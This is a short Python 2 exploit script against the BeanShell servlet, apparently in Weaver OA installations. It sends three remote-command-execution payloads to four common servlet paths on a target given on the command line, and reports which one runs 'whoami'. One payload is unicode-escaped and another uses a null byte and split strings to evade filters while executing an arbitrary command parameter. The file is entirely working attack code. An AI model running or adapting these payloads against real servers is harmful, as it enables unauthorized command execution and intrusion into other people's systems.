import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import requests, sys

headers = {
    'Content-Type': 'text/xml; charset=utf-8',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'Content-Length': '578'
}

url_list = {'url_1':'/bsh.servlet.BshServlet', 'url_2':'/weaver/bsh.servlet.BshServlet', 'url_3':'/weaveroa/bsh.servlet.BshServlet', 'url_4':'/oa/bsh.servlet.BshServlet'}

payload = {'poc_1':'bsh.script=exec("whoami");&bsh.servlet.output=raw', 'poc_2':'bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.output=raw', 'poc_3':r'bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\"command\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami'}

result = 0

def test(target):
    global result
    for url in url_list:
        test_url = target + url_list[url]
        for i in payload:
            try:
                rsp = requests.post(url=test_url, data=payload[i], headers=headers, verify=False, timeout=5)
                sta = rsp.status_code
                num = rsp.text
                if sta == 200 and len(num) < 50:
                    print 'url is ' + test_url + ', payload can use ' + i + ', result is ' + num
                    result = 1
            except Exception:
                pass
    if result == 0:
        print 'not exit!!!'

if __name__ == '__main__':
    print '''
--------------------------------------
BeanShell test script by LuckyEast >_< 
--------------------------------------
'''
    target = sys.argv[1]
    test(target)
#    for line in open(sys.argv[1]).readlines():
#       target=line.strip()
#       test(target)
